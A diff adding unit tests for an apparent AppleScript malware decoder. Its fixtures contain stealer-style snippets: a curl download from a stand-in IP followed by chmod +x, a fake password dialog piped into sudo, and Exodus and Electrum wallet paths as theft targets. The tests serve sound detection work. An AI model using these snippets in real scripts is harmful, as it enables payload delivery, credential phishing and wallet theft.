@@ -68,3 +68,83 @@ describe('decodeAppleScript', () => {
   });
 
 });
+
+describe('value evaluator', () => {
+  it('resolves a concatenated URL from set-vars', () => {
+    const src = [
+      'set host to "198.51.100.7"',
+      'set botPath to "/tmp/update"',
+      'do shell script ("curl -o " & botPath & " https://" & host & "/zxc/app")',
+    ].join('\n');
+    expect(decodeAppleScript(src).capturedStrings).toContain('curl -o /tmp/update https://198.51.100.7/zxc/app');
+  });
+
+  it('unwraps `quoted form of` and leaves unknown vars as placeholders', () => {
+    const src = 'do shell script ("echo " & quoted form of pwd & " | sudo -S id")';
+    expect(decodeAppleScript(src).capturedStrings).toContain('echo <pwd> | sudo -S id');
+  });
+
+  it('does not split on `&` inside a string literal', () => {
+    const src = 'do shell script "echo a & b"';
+    expect(decodeAppleScript(src).capturedStrings).toContain('echo a & b');
+  });
+
+  it('resolves `quoted form of` wrapping a nested concat', () => {
+    const src = [
+      'set username to (system attribute "USER")',
+      'set profile to "/Users/" & username',
+      'set botUrl to "198.51.100.7"',
+      'set botPath to (quoted form of (profile & "/.helper"))',
+      'do shell script "curl -o " & botPath & " https://" & botUrl & "/zxc/app"',
+      'do shell script "chmod +x " & botPath',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(r.capturedStrings).toContain('curl -o /Users/<USER>/.helper https://198.51.100.7/zxc/app');
+    expect(r.capturedStrings).toContain('chmod +x /Users/<USER>/.helper');
+  });
+});
+
+describe('display dialog sink', () => {
+  it('captures a credential-phishing display dialog', () => {
+    const src = 'set pwd to text returned of (display dialog "macOS needs your password." default answer "" with hidden answer)';
+    const r = decodeAppleScript(src);
+    expect(r.events.some((e) => e.kind === 'dialog' && e.detail.includes('[captures password]'))).toBe(true);
+  });
+
+  it('uses a short <varName> placeholder, not the full unresolved expression, for a var assigned from an unresolvable RHS', () => {
+    const src = [
+      'set pwd to text returned of (display dialog "macOS needs your password." default answer "" with hidden answer)',
+      'do shell script ("echo " & quoted form of pwd & " | sudo -S id")',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(r.capturedStrings).toContain('echo <pwd> | sudo -S id');
+  });
+});
+
+describe('run script recursion', () => {
+  it('recovers a run-script argument for recursion', () => {
+    const src = ['set inner to "do shell script \\"echo nested-payload\\""', 'run script inner'].join('\n');
+    // The `do shell script` text inside the string literal on line 1 is DATA
+    // (recovered later via `run script`), not a real sink
+    expect(decodeAppleScript(src).capturedStrings).toEqual(['do shell script "echo nested-payload"']);
+  });
+});
+
+describe('target-artifact enumeration', () => {
+  it('enumerates targets from a walletMap {{...}} block with resolved vars', () => {
+    const src = [
+      'set username to (system attribute "USER")',
+      'set profile to "/Users/" & username',
+      'set library to "/Users/" & username & "/Library/Application Support/"',
+      'set walletMap to {{"Exodus", library & "Exodus/"}, {"Electrum", profile & "/.electrum/wallets/"}}',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(r.targets.find((t) => t.label === 'Exodus')?.path)
+      .toBe('/Users/<USER>/Library/Application Support/Exodus/');
+    expect(r.targets.find((t) => t.label === 'Electrum')?.path).toContain('.electrum');
+  });
+
+  it('yields targets: [] when source has no {{...}} blocks', () => {
+    expect(decodeAppleScript('do shell script "echo hello"').targets).toEqual([]);
+  });
+});
